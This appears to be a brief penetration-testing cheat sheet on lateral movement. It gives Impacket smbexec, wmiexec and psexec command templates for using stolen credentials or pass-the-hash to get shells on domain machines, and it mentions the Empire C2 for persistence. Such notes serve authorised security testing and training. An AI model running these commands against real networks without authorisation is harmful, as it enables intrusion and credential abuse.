## Lateral Movement
```
Gain access in other machines
We can use smbexec,wmiexec,psexec using the gained credentials for a semi interactive shell.Then we can find a way to gain a interactive shell or pipe a C2 Framework like empire for persistence or post exploitation.psexec is noisy and should be as a last resort

NOTE: We can also use hashes instead of password

    smbexec.py domain/username@IPADDRESS
    OR smbexec.py domain/username@IPADDRESS -hashes FullHash (same syntax for below)

    wmiexec.py domain/username@IPADDRESS

    psexec.py domain/username@IPADDRESS
```
